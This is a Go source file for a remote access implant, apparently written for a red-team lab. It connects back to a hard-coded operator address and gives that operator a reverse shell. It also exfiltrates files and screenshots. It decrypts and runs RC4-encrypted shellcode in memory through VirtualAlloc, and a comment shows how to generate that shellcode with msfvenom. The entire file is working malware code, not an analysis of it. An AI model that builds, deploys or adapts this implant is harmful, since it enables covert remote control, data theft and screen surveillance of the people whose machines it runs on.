package main

import (
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/kbinani/screenshot"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MANAGERIP connection string to the manager
const MANAGERIP = "192.168.56.1:8080"

func main() {

	conn, err := net.Dial("tcp", MANAGERIP)
	if err != nil {
		fmt.Println(err)
	}

	getshell(conn)

}

func getshell(conn net.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Shell Disconnected"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			finflag := make(chan string)
			go sendFile(conn, fname, finflag)
			//<-finflag

		} else if strings.Index(command, "grabscreen") == 0 {
			filenames := getscreenshot()
			finflag := make(chan string)
			for _, fname := range filenames {
				go sendFile(conn, fname, finflag)
				<-finflag
				go removetempimages(filenames, finflag)
				//<-finflag

			}

		} else if strings.Index(command, "key") == 0 {
			shellcodevals := strings.Split(command, " ")
			//finflag := make(chan string)
			//msfvenom -p payload lhost=ip lport=port --encrypt=rc4 --encrypt-key fakeit -f csharp | base64 | tr -d "\n"
			decodedshellcode, _ := base64.StdEncoding.DecodeString(shellcodevals[2])
			go decryptandexecuteshellcode([]byte(decodedshellcode), shellcodevals[1])
			conn.Write([]byte("Done"))
		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			/*if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {

				i := BUFFSIZE
				for {
					if i > len(cmdout) {

						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {

						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func decryptandexecuteshellcode(shellcodetodecrypt []byte, key string) {
	const (
		MEM_COMMIT             = 0x1000
		PAGE_EXECUTE_READWRITE = 0x40
	)

	keybytes := []byte(key)
	ciphertext := shellcodetodecrypt
	decrypted := make([]byte, len(ciphertext))
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := rc4.NewCipher(keybytes)
	if err != nil {
		fmt.Println(err.Error)
	}

	c.XORKeyStream(decrypted, ciphertext)

	k32 := syscall.MustLoadDLL("kernel32.dll")
	valloc := k32.MustFindProc("VirtualAlloc")

	//make space for shellcode
	addr, _, _ := valloc.Call(0, uintptr(len(decrypted)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	ptrtoaddressallocated := (*[6500]byte)(unsafe.Pointer(addr))
	//now copy our shellcode to the ptrtoaddressallocated
	for i, value := range decrypted {
		ptrtoaddressallocated[i] = value
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
	//finflag <- "Shellcode executed"
}

func removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func sendFile(revConn net.Conn, fname string, finflag chan string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	finflag <- "file sent"

	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames
}
